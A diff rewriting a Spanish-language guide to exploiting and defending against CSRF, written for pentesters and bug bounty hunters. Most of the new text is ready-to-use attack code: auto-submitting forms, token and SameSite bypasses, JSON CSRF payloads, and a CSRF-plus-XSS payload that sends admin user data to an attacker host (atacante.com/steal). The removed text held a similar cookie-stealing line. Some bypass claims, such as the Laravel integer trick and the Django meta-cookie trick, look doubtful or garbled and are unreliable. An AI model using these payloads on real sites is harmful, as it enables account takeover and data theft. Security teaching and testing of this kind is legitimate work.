@@ -1,202 +1,654 @@
-# ¿Qué es CSRF (Cross-Site Request Forgery)?
+# CSRF (Cross-Site Request Forgery) - Guía Completa
 
-CSRF, o Falsificación de Peticiones en Sitios Cruzados, es un tipo de ataque que obliga a un usuario final autenticado a ejecutar acciones no deseadas en una aplicación web en la que tiene una sesión activa. El atacante prepara una petición maliciosa y engaña al navegador de la víctima para que la envíe al sitio vulnerable. Como el navegador de la víctima envía automáticamente las cookies de sesión asociadas con el sitio, la petición se procesa como si fuera una acción legítima del usuario.
+El Cross-Site Request Forgery (CSRF) sigue siendo una de las vulnerabilidades más peligrosas en aplicaciones web modernas, especialmente cuando los desarrolladores asumen incorrectamente que las defensas actuales como SameSite cookies han resuelto completamente el problema. En 2024, seguimos viendo vulnerabilidades CSRF críticas en sistemas como Ampache y aplicaciones bancarias, demostrando que los atacantes continúan encontrando formas de bypassear las protecciones modernas.[^5]
 
-**Condiciones para un ataque CSRF exitoso:**
+## ¿Qué es CSRF?
 
-1. **Acción Relevante:** Existe una acción en la aplicación objetivo que el atacante quiere realizar (e.g., cambiar email, transferir fondos, añadir un usuario admin).
-2. **Manejo de Sesión Basado en Cookies:** La aplicación usa cookies para gestionar las sesiones y el navegador las envía automáticamente con cada petición al dominio correspondiente.
-3. **Parámetros de Petición Predecibles:** Todos los parámetros necesarios para ejecutar la acción son conocidos o predecibles por el atacante. No hay parámetros secretos o impredecibles (como un token CSRF válido) que el atacante no pueda obtener o adivinar.
+CSRF es un ataque que obliga a un usuario autenticado a ejecutar acciones no deseadas en una aplicación web donde tiene una sesión activa. El atacante prepara una petición maliciosa y engaña al navegador de la víctima para que la envíe al sitio vulnerable, aprovechando que el navegador envía automáticamente las cookies de sesión.[^6]
 
-### Ejemplo Básico: CSRF con Petición GET
+### Condiciones para un ataque CSRF exitoso
 
-Las peticiones GET son las más fáciles de explotar para CSRF, ya que pueden ser activadas por simples enlaces o recursos embebidos.
+1. **Acción Relevante:** Una acción en la aplicación que el atacante quiere realizar (cambiar email, transferir fondos, crear usuario admin)
+2. **Manejo de Sesión Basado en Cookies:** La aplicación usa cookies para gestionar sesiones
+3. **Parámetros Predecibles:** Todos los parámetros son conocidos o predecibles por el atacante, sin tokens CSRF válidos[^6]
 
-**Escenario:** Un sitio permite comprar criptomonedas mediante una petición GET. `http://cryptosite.com/buy.php?wallet=[DIRECCION_ATACANTE]&amount=100&type=BTC`
+## Ejemplos Básicos de Explotación
 
-**Explotación:**
+### CSRF con Petición GET
 
-1. **Enlace malicioso:** El atacante puede enviar un email o mensaje a la víctima c
+Las peticiones GET son las más fáciles de explotar porque pueden activarse con simples enlaces o recursos embebidos.[^7]
 
-```html
-  <a href="http://cryptosite.com/buy.php?wallet=DIRECCION_ATACANTE&amount=100&type=BTC">¡Gana un iPhone!</a>
+**Escenario:** Compra de criptomonedas mediante GET:
+
+```
+http://victima.com/buy.php?wallet=DIRECCION_ATACANTE&amount=1000&type=BTC
 ```
 
-2. **Imagen embebida (sin interacción del usuario más allá de cargar la página del atacante):**
+**Explotación con enlace malicioso:**
 
 ```html
- <img src="http://cryptosite.com/buy.php?wallet=DIRECCION_ATACANTE&amount=100&type=BTC" width="1" height="1" alt="pixel">
+<a href="http://victima.com/buy.php?wallet=DIRECCION_ATACANTE&amount=1000&type=BTC">
+  ¡Gana un iPhone gratis!
+</a>
 ```
 
-Si la víctima está autenticada en `cryptosite.com` y carga la página del atacante (o hace clic en el enlace), su navegador enviará la petición GET a `cryptosite.com` junto con sus cookies de sesión, ejecutando la compra.
-
-**Ejemplo práctico (Notifications en CTFIO Hub):** URL vulnerable (activa notificaciones): `https://[yourhub].ctfio.com/notifications?enabled=true`
-
-**Simulación Local (Página del Atacante):**
-
-1. Crea un archivo `index.html` en tu máquina:
+**Explotación sin interacción (imagen invisible):**
 
 ```html
-  <html>
-  <body>
-  <h1>Página del Atacante</h1>
-  <p>¡Contenido interesante aquí!</p>
-  <img src="https://[yourhub].ctfio.com/notifications?enabled=true" width="1" height="1">
- <br>
- <a href="https://[yourhub].ctfio.com/notifications?enabled=true">Haz clic para una sorpresa</a>
- </body>
-</html>
+<img src="http://victima.com/buy.php?wallet=DIRECCION_ATACANTE&amount=1000&type=BTC" 
+     width="1" height="1" alt="tracking">
 ```
 
-2. Sirve esta página localmente:
-   - **Apache:** `sudo cp index.html /var/www/html/` y accede a `http://localhost/index.html`.
-   - **Python:** Navega al directorio donde guardaste `index.html` y ejecuta `python3 -m http.server 8000`. Accede a `http://localhost:8000/index.html`.
+### CSRF con Petición POST
 
-### Ejemplo: CSRF con Petición POST
-
-Las peticiones POST son un poco más complejas de explotar que las GET, pero igualmente vulnerables si no hay protecciones.
-
-**Formulario Vulnerable en `victim-site.com/email_change`:**
+**Formulario vulnerable en victima.com:**
 
 ```html
-<form method="post" action="/email_change_action">
-  <label>New Email Address:</label>
-  <input name="email" value="current_user@victim.com">
-  <input type="submit" value="Update Email">
+<form method="post" action="/change_email">
+  <label>Nuevo Email:</label>
+  <input name="email" value="usuario@victima.com">
+  <input type="submit" value="Actualizar Email">
 </form>
 ```
 
-**Formulario del Atacante en `attacker-site.com`:** El atacante crea una página con un formulario que apunta al endpoint vulnerable, pero con valores maliciosos y, opcionalmente, lo auto-envía.
+**Página maliciosa del atacante:**
 
 ```html
 <html>
-  <body onload="document.csrf_form.submit()"> <p>Cargando...</p>
-    <form name="csrf_form" action="https://victim-site.com/email_change_action" method="post">
-      <input type="hidden" name="email" value="hacker@evil.com">
-      <input type="submit" value="Gana un Premio (Falso)">
+  <body onload="document.csrf_form.submit()">
+    <p>Cargando contenido exclusivo...</p>
+    <form name="csrf_form" action="https://victima.com/change_email" method="post">
+      <input type="hidden" name="email" value="atacante@atacante.com">
+      <input type="submit" value="Obtener Regalo (Falso)">
     </form>
   </body>
 </html>
 ```
 
-Cuando la víctima visita la página del atacante, el formulario se envía automáticamente. Su navegador adjuntará las cookies de sesión de `victim-site.com`, y el email se cambiará al del atacante.
+## Protecciones CSRF y sus Bypasses Modernos
 
-### Protecciones CSRF y sus Bypasses
+### Tokens Anti-CSRF y sus Vulnerabilidades
 
-La contramedida más común contra CSRF es el uso de **Tokens Anti-CSRF**.
+Los tokens CSRF son la defensa más común, pero su implementación frecuentemente tiene fallas:[^9]
 
-**¿Cómo funcionan los Tokens Anti-CSRF (Synchronizer Token Pattern)?**
-
-1. Cuando el usuario solicita un formulario o una página que realiza una acción sensible, el servidor genera un token único y secreto.
-2. Este token se incrusta como un campo oculto en el formulario y/o se almacena en la sesión del usuario en el servidor.
-3. Cuando el usuario envía el formulario, el token se envía de vuelta al servidor.
-4. El servidor compara el token recibido con el que tiene almacenado (o asociado a la sesión). Si coinciden, la petición es válida. Si no, se rechaza.
-
-Un atacante no puede adivinar este token para incluirlo en su formulario CSRF.
-
-**Bypasses Comunes de Tokens CSRF:**
-
-1. **Token Ausente o No Validado por el Servidor:**
-   - Simplemente se omite el parámetro del token en la petición CSRF. Si el servidor no lo valida, el ataque funciona.
-2. **Token Presente pero la Validación Puede Ser Bypasseada:**
-   - Enviar un token vacío o un token de longitud incorrecta, y ver si el servidor lo acepta.
-3. **Cambio de Método HTTP:**
-   - La aplicación valida el token solo para peticiones POST. Si la misma acción puede realizarse mediante una petición GET (que no suele requerir el token), el atacante puede usar CSRF vía GET.
-     - Ejemplo: `POST /delete_user?user_id=123&csrf_token=XYZ` (protegido)
-     - Prueba: `GET /delete_user?user_id=123` (podría funcionar sin token)
-4. **Token Filtrado (Leaked):**
-   - **Referer Header:** Si el token se incluye en la URL y el sitio hace peticiones a sitios externos, el token podría filtrarse a través de la cabecera `Referer`.
-   - **XSS:** Una vulnerabilidad XSS en el sitio puede usarse para leer el token del DOM y luego realizar una petición CSRF válida.
-   - **Otras Fugas de Información:** Si el token se muestra en algún lugar accesible o se loguea incorrectamente.
-5. **Token Débil o Predecible:**
-   - Si el token se genera de forma predecible (e.g., basado en timestamp, o es un simple hash de datos conocidos), el atacante podría generarlo.
-   - El ejemplo de "Decodificación Base64" que tenías podría encajar aquí si el token es un objeto (como un JWT) firmado débilmente o sin firmar, donde el atacante pudiera modificar partes y re-firmar (o no necesitar firmar). Sin embargo, esto es más complejo que un simple CSRF token. Generalmente, los tokens CSRF son strings opacos.
-     - Si un token es: `base64_encode(json_encode({"user_id": 123, "timestamp": "..."}))` y no está firmado o la firma es trivial, un atacante podría intentar forjarlo. Esto es una implementación muy pobre.
-6. **Alcance del Token Incorrecto (Token No Vinculado a la Acción o Usuario Específico):**
-   - El mismo token es válido para todas las acciones de un usuario, o incluso para todos los usuarios. Un atacante podría obtener un token válido (e.g., de su propia cuenta) e intentar usarlo en un ataque CSRF contra otra cuenta.
-7. **Reutilización de Tokens / Token No Es de Un Solo Uso:**
-   - Si un token sigue siendo válido después de ser usado una vez.
-8. **Manejo Inseguro de "Double Submit Cookies":**
-   - En este patrón, el token se envía tanto en una cookie como en un parámetro de la petición. El servidor solo verifica que ambos coincidan.
-   - Si el sitio tiene una vulnerabilidad que permita al atacante establecer cookies para el dominio víctima (e.g., una XSS en un subdominio, o si el sitio acepta cookies de subdominios de forma insegura), el atacante podría fijar su propio par cookie/token.
-
-**Ejemplo de Formulario CSRF Omitiendo Token (si no se valida):**
+**Bypass 1: Token Ausente o No Validado**
 
 ```html
-<body onload="document.csrf_form.submit()">
-  <form name="csrf_form" action="https://victim-site.com/change_password" method="post">
-    <input type="hidden" name="new_password" value="HackedPassword123">
-    <input type="hidden" name="confirm_password" value="HackedPassword123">
-    </form>
-</body>
+<!-- Original con token -->
+<input type="hidden" name="csrf_token" value="abc123xyz">
+<input type="hidden" name="email" value="nuevo@email.com">
+
+<!-- Bypass: Omitir completamente el token -->
+<form action="https://victima.com/change_email" method="post">
+  <input type="hidden" name="email" value="atacante@atacante.com">
+</form>
 ```
 
-### Escalada de Self-XSS a XSS "Real" mediante CSRF
+**Bypass 2: Cambio de Método HTTP**
 
-**Self-XSS (Auto-XSS):** Es un tipo de XSS donde el atacante solo puede ejecutar el script en su propio navegador o sesión. Por ejemplo, si inyecta un payload en un campo de su perfil que solo él ve, o si el payload requiere una interacción manual muy específica del propio usuario. Tradicionalmente, se considera de bajo impacto porque el atacante no puede forzar su ejecución en navegadores de otras víctimas.
+```javascript
+// Original protegido (POST)
+POST /admin/delete_user
+csrf_token=abc123
+user_id=victim
 
-**Encadenamiento CSRF + Self-XSS:** Se puede convertir un Self-XSS en un XSS explotable contra otras víctimas combinándolo con CSRF.
+// Bypass via GET si el endpoint lo acepta
+GET /admin/delete_user?user_id=victim
+```
 
-**Escenario:**
+**Bypass 3: Token No Vinculado a la Sesión**[^10]
+Si el token no está vinculado específicamente a la sesión del usuario:
 
-1. **Vulnerabilidad Self-XSS:** Un campo en `https://victim-site.com/profile_update` permite al usuario guardar un payload XSS (e.g., en el campo "nombre"), pero este script solo se ejecuta cuando el propio usuario ve su perfil o la página donde se refleja.
-   - Payload Self-XSS: `<script>alert('Self-XSS ejecutado para: ' + document.domain)</script>`
-2. **Acción CSRF:** La actualización del perfil se realiza mediante una petición POST a `https://victim-site.com/profile_update_action` sin una protección CSRF robusta.
+```html
+<!-- El atacante obtiene su propio token válido -->
+<form action="https://victima.com/sensitive_action" method="post">
+  <input type="hidden" name="csrf_token" value="ATACANTE_VALID_TOKEN">
+  <input type="hidden" name="action" value="malicious_action">
+</form>
+```
 
-**Explotación Combinada:** El atacante crea una página web maliciosa que contiene un formulario CSRF. Este formulario apunta al endpoint de actualización del perfil y tiene campos ocultos que contienen el payload de Self-XSS.
+### Bypasses de SameSite Cookies
 
-**Página del Atacante (`attacker-site.com/exploit.html`):**
+Aunque SameSite=Lax es ahora el default en navegadores modernos, existen múltiples técnicas de bypass:[^11]
+
+#### 1. Method Override Bypass[^13]
+
+Los frameworks que soportan HTTP Method Override pueden ser vulnerables:
+
+```html
+<!-- Bypass usando _method parameter -->
+<form action="https://victima.com/api/delete" method="GET">
+  <input type="hidden" name="_method" value="DELETE">
+  <input type="hidden" name="resource_id" value="critical_data">
+</form>
+```
+
+```html
+<!-- Bypass usando header override -->
+<script>
+fetch('https://victima.com/api/sensitive', {
+  method: 'GET',
+  credentials: 'include',
+  headers: {
+    'X-HTTP-Method-Override': 'POST'
+  }
+});
+</script>
+```
+
+#### 2. SameSite Lax Cookie Refresh Bypass[^11]
+
+Chrome no aplica restricciones SameSite durante los primeros 120 segundos después de establecer una cookie:
+
+```html
+<script>
+// Forzar refresh de cookie abriendo nueva pestaña
+window.onclick = () => {
+  window.open('https://victima.com/login/oauth');
+  // Esperar un momento y luego ejecutar CSRF
+  setTimeout(() => {
+    document.getElementById('csrf_form').submit();
+  }, 1000);
+};
+</script>
+```
+
+#### 3. Subdomain Cookie Injection[^15]
+
+Si el atacante controla un subdominio:
+
+```html
+<!-- En atacante.victima.com -->
+<script>
+document.cookie = "_csrf=controlled_value; Path=/api; domain=victima.com";
+// Ahora puede usar este valor en ataques CSRF
+</script>
+```
+
+### JSON-Based CSRF Attacks
+
+Los ataques CSRF JSON son especialmente peligrosos en APIs modernas:[^18]
+
+#### Content-Type Bypass Technique
+
+```html
+<form action="https://victima.com/api/update_profile" method="POST" enctype="text/plain">
+  <input type="hidden" name='{"email":"atacante@atacante.com","role":"admin"}' value=''>
+</form>
+```
+
+**Resultado:** El servidor recibe:
+
+```json
+{"email":"atacante@atacante.com","role":"admin"}=
+```
+
+#### Advanced JSON CSRF con Fetch API
+
+```html
+<script>
+// Bypass para APIs que requieren application/json
+fetch('https://victima.com/api/transfer_funds', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {
+    'Content-Type': 'text/plain'  // Evita preflight
+  },
+  body: JSON.stringify({
+    amount: 10000,
+    destination: "atacante_account"
+  })
+});
+</script>
+```
+
+## Técnicas Avanzadas de Explotación
+
+### Self-XSS a XSS Real mediante CSRF
+
+**Escenario:** Self-XSS en campo de perfil + endpoint vulnerable a CSRF
+
+**Payload CSRF que inyecta XSS:**
 
 ```html
 <html>
   <body onload="document.csrf_xss_form.submit()">
-    <p>Cargando contenido exclusivo...</p>
-    <form name="csrf_xss_form" action="https://victim-site.com/profile_update_action" method="post">
-      <input type="hidden" name="username" value="Víctima"> <input type="hidden" name="name" value="<script>var i=new Image(); i.src='//atacante.com/steal?c='+document.cookie;</script>">
-      <input type="hidden" name="description" value="Este es mi nuevo perfil con XSS!">
-      </form>
+    <form name="csrf_xss_form" action="https://victima.com/update_profile" method="post">
+      <input type="hidden" name="username" value="Usuario Normal">
+      <input type="hidden" name="bio" value="<script>fetch('/api/admin/users').then(r=>r.json()).then(d=>fetch('https://atacante.com/steal',{method:'POST',body:JSON.stringify(d)}));</script>">
+    </form>
   </body>
 </html>
 ```
 
-**Flujo del Ataque:**
+**Flujo del ataque:**
 
-1. El atacante engaña a una víctima (que está autenticada en `victim-site.com`) para que visite `attacker-site.com/exploit.html`.
-2. El JavaScript en la página del atacante auto-envía el formulario CSRF.
-3. El navegador de la víctima envía la petición POST a `https_victim-site.com/profile_update_action` con las cookies de sesión de la víctima.
-4. El servidor de `victim-site.com` procesa la petición y actualiza el perfil de la víctima, guardando el payload XSS (`<script>...document.cookie...</script>`) en el campo "nombre".
-5. Ahora, cuando la víctima (o cualquier otra persona, si el perfil es público y el XSS es Stored) visite la página donde se muestra el nombre del perfil, el payload XSS se ejecutará en su navegador, robando sus cookies (o realizando cualquier otra acción maliciosa).
+1. Víctima visita página del atacante
+2. CSRF actualiza perfil con payload XSS
+3. Cuando víctima ve su perfil, ejecuta el XSS
+4. Script roba datos administrativos
 
-El Self-XSS, que antes solo afectaba al atacante, ahora se ha convertido en un Stored XSS (o Reflected XSS, dependiendo de cómo se muestre el campo) funcional contra la víctima, todo gracias al CSRF.
+### CSRF in OAuth Flows[^19]
 
-### Otras Defensas CSRF (Además de Tokens)
+OAuth mal implementado es vulnerable a CSRF:
 
-- **Cookies SameSite (`Lax` o `Strict`):**
-  - Es una de las defensas más efectivas y modernas. Indica al navegador cuándo debe enviar cookies con peticiones cross-site.
-  - `Strict`: Las cookies solo se envían si la petición se origina desde el mismo sitio. Bloquea casi todos los CSRF.
-  - `Lax`: Las cookies se envían con navegación de alto nivel (e.g., clic en un enlace) pero no con peticiones cross-site "no seguras" (POST, PUT, DELETE) ni con subrecursos (`<img>`, `<iframe>`). `Lax` es el valor por defecto para nuevas cookies en muchos navegadores. Mitiga la mayoría de CSRF vía POST.
-- **Comprobación de Cabeceras `Origin` y/o `Referer`:**
-  - El servidor puede verificar que la petición provenga de un origen esperado.
-  - `Origin`: Enviada por el navegador en peticiones cross-origin (POST, PUT, DELETE, y CORS).
-  - `Referer`: Enviada por el navegador indicando la URL de la página anterior.
-  - **Limitaciones:** Pueden ser eliminadas por el navegador por razones de privacidad, o a veces pueden ser falseadas o bypassadas en escenarios específicos (e.g., si la política del Referer es muy laxa, o mediante otros exploits). No deben ser la única defensa.
-- **Re-autenticación del Usuario:**
-  - Para acciones extremadamente sensibles (cambio de contraseña, confirmación de pagos importantes), requerir que el usuario vuelva a introducir su contraseña.
+```html
+<!-- Forzar autorización no deseada -->
+<iframe src="https://oauth-provider.com/authorize?client_id=APP_ID&redirect_uri=https://victima.com/callback&scope=admin&state=PREDICTABLE"></iframe>
+```
 
-### Metodología de Testeo para CSRF
+### Double Submit Cookie Vulnerabilities[^15]
 
-1. **Identificar Funcionalidades Clave:** Lista todas las acciones que cambian estado en la aplicación (crear, modificar, borrar datos, funciones que ejecutan acciones).
-2. **Analizar Peticiones:** Para cada acción, captura la petición HTTP (GET o POST) y sus parámetros.
-3. **Verificar Protecciones CSRF:**
-   - ¿Hay un token anti-CSRF?
-   - ¿Cómo se genera? ¿Dónde se envía (parámetro, cabecera)?
-4. **Intentar Bypasses del Token (si existe):**
-   - ¿Qué pasa si omites el token?
-   - ¿Qué pasa si envías un token vacío o inválido?
-   - ¿Se valida el token para todos los métodos HTTP que permiten la acción (GET, POST)?
-   - ¿Puedes obtener un token de tu sesión y usarlo contra otra víctima?
-   - ¿Se puede predecir el token?
-5. **Comprobar Otras Protecciones:**
-   - ¿Se usan cookies SameSite? ¿Con qué política (`Lax`, `Strict`)?
-   - ¿Se validan las cabeceras `Origin` o `Referer`? ¿Se pueden bypassar?
-6. **Construir el PoC:** Si encuentras una vulnerabilidad, crea un PoC (prueba de concepto) HTML/JS para demostrar el impacto.
+Cuando la validación solo verifica que el token de cookie coincida con el parámetro:
+
+```javascript
+// Si el atacante puede inyectar cookies
+document.cookie = "csrf_token=controlled_value; domain=victima.com";
+
+// Entonces puede usar ese valor en el ataque
+fetch('/api/sensitive', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {
+    'X-CSRF-Token': 'controlled_value'
+  },
+  body: 'malicious=data'
+});
+```
+
+## Vulnerabilidades Reales Documentadas
+
+### CVE-2024-56924: Internet Banking System[^3]
+
+CSRF que permite ejecución de JavaScript arbitrario en página de administración, llevando a cambios no autorizados de configuración de cuenta.
+
+### CVE-2024-51489: Ampache Messaging System[^1]
+
+Validación inadecuada de tokens CSRF permite a atacantes enviar mensajes a cualquier usuario, incluyendo administradores.
+
+### CVE-2024-47828: Ampache Object Deletion[^4]
+
+CSRF que permite eliminar objetos (playlists, smartlists) de otros usuarios mediante scripts maliciosos.
+
+## Técnicas Modernas de Bypass 2024
+
+### 1. Mobile Browser SameSite Bypass[^22]
+
+Android browsers tenían una vulnerabilidad que permitía bypass via intent redirection:
+
+```html
+<script>
+if (navigator.userAgent.includes('Android')) {
+  location = 'intent://victima.com/sensitive_action#Intent;scheme=https;package=com.android.chrome;end';
+}
+</script>
+```
+
+### 2. Laravel CSRF Bypass[^8]
+
+85% de tokens CSRF en Laravel comenzaban con letra o cero, permitiendo bypass:
+
+```javascript
+fetch('/api/delete', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    action: "delete",
+    _token: 0  // Integer bypass
+  })
+});
+```
+
+### 3. Framework-Specific Bypasses
+
+**Django CSRF Bypass:**
+
+```html
+<meta http-equiv="set-cookie" content="csrftoken=controlled; domain=victima.com">
+```
+
+**Rails Authenticity Token Bypass:**
+
+```html
+<!-- Si el token no se valida en GET -->
+<img src="https://victima.com/admin/delete_user/123?authenticity_token=">
+```
+
+## Metodología de Testing Avanzada
+
+### 1. Identificación de Superficies de Ataque
+
+```bash
+# Buscar endpoints que cambien estado
+grep -r "POST\|PUT\|DELETE\|PATCH" source_code/
+# Identificar formularios sin tokens
+grep -r "<form" templates/ | grep -v "csrf"
+# Buscar APIs JSON
+grep -r "application/json" config/
+```
+
+### 2. Análisis de Protecciones
+
+**Verificar SameSite Cookies:**
+
+```javascript
+// En DevTools Console
+document.cookie.split(';').forEach(c => {
+  if (c.includes('SameSite')) console.log(c);
+});
+```
+
+**Testing de Tokens CSRF:**
+
+```bash
+# Token presente
+curl -X POST https://victima.com/api/action -d "csrf_token=valid&action=test"
+
+# Token omitido
+curl -X POST https://victima.com/api/action -d "action=test"
+
+# Token inválido
+curl -X POST https://victima.com/api/action -d "csrf_token=invalid&action=test"
+```
+
+### 3. Construcción de PoCs
+
+**Template Básico:**
+
+```html
+<html>
+<head><title>CSRF PoC</title></head>
+<body>
+  <h1>CSRF Proof of Concept</h1>
+  <p>Este PoC demuestra CSRF en: TARGET_URL</p>
+  
+  <form action="TARGET_URL" method="POST" id="csrf_form">
+    <!-- Campos maliciosos aquí -->
+    <input type="hidden" name="field1" value="malicious_value1">
+    <input type="hidden" name="field2" value="malicious_value2">
+  </form>
+  
+  <script>
+    // Auto-submit después de 3 segundos
+    setTimeout(() => {
+      document.getElementById('csrf_form').submit();
+    }, 3000);
+  </script>
+</body>
+</html>
+```
+
+## Defensas Modernas y Mejores Prácticas
+
+### 1. Implementación Correcta de SameSite
+
+```http
+Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly
+```
+
+- **Strict:** Máxima protección, no se envía en ninguna request cross-site
+- **Lax:** Balanceado, permite top-level navigation
+- **None:** Solo con Secure flag
+
+### 2. Tokens CSRF Robustos[^23]
+
+```javascript
+// Generación segura de tokens
+const crypto = require('crypto');
+
+function generateCSRFToken() {
+  return crypto.randomBytes(32).toString('hex');
+}
+
+// Validación por sesión
+function validateCSRF(req, res, next) {
+  const sessionToken = req.session.csrfToken;
+  const requestToken = req.body._csrf || req.headers['x-csrf-token'];
+  
+  if (!sessionToken || sessionToken !== requestToken) {
+    return res.status(403).json({error: 'Invalid CSRF token'});
+  }
+  next();
+}
+```
+
+### 3. Double Submit Cookie Signed[^20]
+
+```javascript
+const hmac = crypto.createHmac('sha256', secret_key);
+hmac.update(token + session_id);
+const signedToken = hmac.digest('hex');
+```
+
+### 4. Validación de Headers
+
+```javascript
+// Verificar Origin/Referer
+function validateOrigin(req, res, next) {
+  const origin = req.headers.origin || req.headers.referer;
+  const allowedOrigins = ['https://victima.com'];
+  
+  if (!allowedOrigins.includes(origin)) {
+    return res.status(403).json({error: 'Invalid origin'});
+  }
+  next();
+}
+```
+
+### 5. Framework-Specific Protections
+
+**React CSRF Protection:**[^24]
+
+```jsx
+// Custom hook para CSRF
+function useCSRF() {
+  const [token, setToken] = useState('');
+  
+  useEffect(() => {
+    fetch('/api/csrf-token')
+      .then(r => r.json())
+      .then(data => setToken(data.token));
+  }, []);
+  
+  return token;
+}
+```
+
+**Laravel CSRF (Modern):**[^25]
+
+```php
+// En Kernel.php
+protected $middlewareGroups = [
+    'web' => [
+        \App\Http\Middleware\VerifyCsrfToken::class,
+    ],
+];
+```
+
+## Consideraciones para Bug Bounty 2024
+
+### Targets de Alto Valor
+
+1. **APIs internas** expuestas sin protección CSRF
+2. **Aplicaciones móviles** con web components
+3. **Microservicios** con autenticación compartida
+4. **Sistemas OAuth** mal configurados
+5. **Applications financieras** con validaciones client-side
+
+### Técnicas de Reconnaissance
+
+```bash
+# Buscar endpoints sin protección
+subfinder -d target.com | httpx | nuclei -t csrf/
+
+# Identificar frameworks vulnerables
+whatweb target.com | grep -E "Laravel|Django|Rails"
+
+# Análizar cookies
+curl -I https://target.com | grep -i "set-cookie"
+```
+
+### Automation Scripts
+
+```python
+import requests
+from bs4 import BeautifulSoup
+
+def test_csrf_bypass(url, data):
+    # Test 1: Sin token
+    resp1 = requests.post(url, data=data)
+  
+    # Test 2: Token vacío  
+    data['csrf_token'] = ''
+    resp2 = requests.post(url, data=data)
+  
+    # Test 3: Cambio a GET
+    resp3 = requests.get(url, params=data)
+  
+    return [resp1.status_code, resp2.status_code, resp3.status_code]
+```
+
+## Reporting Efectivo
+
+### Template de Reporte
+
+```markdown
+## CSRF Vulnerability in Email Change Function
+
+**Severity:** High
+**CVSS:** 8.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
+
+### Summary
+The email change functionality lacks CSRF protection, allowing attackers 
+to change any authenticated user's email address without their consent.
+
+### Proof of Concept
+1. User logs into https://victima.com
+2. User visits attacker page: https://atacante.com/csrf.html
+3. Page auto-submits form changing user's email
+
+### Impact
+- Account takeover via password reset
+- Unauthorized access to sensitive data
+- Potential privilege escalation
+
+### Remediation
+- Implement CSRF tokens for all state-changing operations
+- Configure SameSite=Strict on session cookies
+- Validate Origin/Referer headers
+```
+
+El CSRF sigue siendo un vector de ataque crítico en 2024 porque los desarrolladores frecuentemente implementan defensas incorrectas o incompletas. Los atacantes modernos combinan técnicas clásicas con nuevos métodos de bypass específicos para frameworks actuales, APIs JSON, y aplicaciones móviles.[^5]
+
+La clave para una defensa efectiva está en implementar múltiples capas de protección: tokens CSRF robustos, cookies SameSite configuradas correctamente, validación de headers, y testing continuo. Para los bug bounty hunters, el enfoque debe estar en identificar implementaciones incorrectas de estas defensas y encontrar endpoints olvidados que no tengan protección CSRF.
+<span style="display:none">[^33][^41][^49][^53]</span>
+
+<div style="text-align: center">CSRF (Cross-Site Request Forgery) - Guía Completa</div>
+
+[^1]: https://www.invicti.com/web-application-vulnerabilities/ampache-cross-site-request-forgery-csrf-vulnerability-cve-2024-51489
+    
+[^2]: https://learn.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?view=aspnetcore-9.0
+    
+[^3]: https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2024-56924
+    
+[^4]: https://www.invicti.com/web-application-vulnerabilities/ampache-cross-site-request-forgery-csrf-vulnerability-cve-2024-47828
+    
+[^5]: https://infosecwriteups.com/csrf-in-2025-solved-but-still-bypassable-942ca382ab77
+    
+[^6]: https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF
+    
+[^7]: https://brightsec.com/blog/csrf-example/
+    
+[^8]: https://www.cobalt.io/blog/csrf-bypasses
+    
+[^9]: https://www.intigriti.com/researchers/blog/hacking-tools/csrf-a-complete-guide-to-exploiting-advanced-csrf-vulnerabilities
+    
+[^10]: https://www.linkedin.com/pulse/bypassing-unpredictable-csrf-tokens-muvhango-magatshavha-jl7lf
+    
+[^11]: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
+    
+[^12]: https://hazanasec.github.io/2023-07-30-Samesite-bypass-method-override.md/
+    
+[^13]: https://www.sidechannel.blog/en/http-method-override-what-it-is-and-how-a-pentester-can-use-it/
+    
+[^14]: https://osintteam.blog/web-security-academy-csrf-samesite-lax-bypass-via-cookie-refresh-775f4f6efdc2
+    
+[^15]: https://owasp.org/www-chapter-london/assets/slides/David_Johansson-Double_Defeat_of_Double-Submit_Cookie.pdf
+    
+[^16]: https://sallam.gitbook.io/sec-88/write-ups/exploiting-json-based-csrf-the-hidden-threat-in-profile-management
+    
+[^17]: https://bugbase.ai/blog/how-to-bypass-csrf-protection
+    
+[^18]: https://stackoverflow.com/questions/11008469/are-json-web-services-vulnerable-to-csrf-attacks
+    
+[^19]: https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/
+    
+[^20]: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
+    
+[^21]: https://outpost24.com/blog/csrf-attacks-simplified-guide/
+    
+[^22]: https://www.certuscyber.com/insights/bypass-samesite-cookie/
+    
+[^23]: https://zuplo.com/learning-center/preventing-cross-site-request-forgery-in-apis
+    
+[^24]: https://www.stackhawk.com/blog/react-csrf-protection-guide-examples-and-how-to-enable-it/
+    
+[^25]: https://moldstud.com/articles/p-comparing-csrf-protection-methods-lumen-vs-other-frameworks
+    
+[^26]: https://www.incibe.es/index.php/en/incibe-cert/early-warning/vulnerabilities/cve-2024-52402
+    
+[^27]: https://portswigger.net/web-security/csrf
+    
+[^28]: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override
+    
+[^29]: http://scielo.sld.cu/scielo.php?script=sci_abstract\&pid=S2306-24952024000700133\&lng=en\&nrm=iso
+    
+[^30]: https://learn.snyk.io/lesson/csrf-attack/
+    
+[^31]: https://stackoverflow.com/questions/79368322/how-to-bypass-samesite-cookie-restriction-in-microsoft-edge-during-local-develop
+    
+[^32]: https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ise-csrf-y4ZUz5Rj
+    
+[^33]: https://www.imperva.com/learn/application-security/csrf-cross-site-request-forgery/
+    
+[^34]: https://www.youtube.com/watch?v=ucHEU1Z9DhU
+    
+[^35]: https://nvd.nist.gov/vuln/detail/CVE-2024-51484
+    
+[^36]: https://en.wikipedia.org/wiki/Cross-site_request_forgery
+    
+[^37]: https://vulnapi.cerberauth.com/docs/vulnerabilities/security-misconfiguration/http-method-allow-override
+    
+[^38]: https://www.linkedin.com/pulse/how-double-submit-cookie-prevent-csrf-viral-parmar-qzyqc
+    
